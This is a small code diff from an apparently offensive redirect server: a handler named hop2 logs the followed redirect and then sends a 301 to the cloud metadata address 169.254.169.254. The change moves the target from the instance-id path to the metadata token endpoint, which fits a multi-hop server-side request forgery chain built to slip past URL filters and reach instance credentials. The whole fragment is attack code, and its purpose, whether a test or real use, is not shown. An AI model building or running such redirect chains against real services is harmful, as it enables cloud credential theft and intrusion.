@@ -24,7 +24,7 @@ def hop2():
     log_request("HOP2 — REDIRECT FOLLOWED")
     # only now redirect to the actual target
     return redirect(
-        "http://169.254.169.254/latest/meta-data/instance-id",
+        "http://169.254.169.254/latest/api/token",
         code=301
     )
 
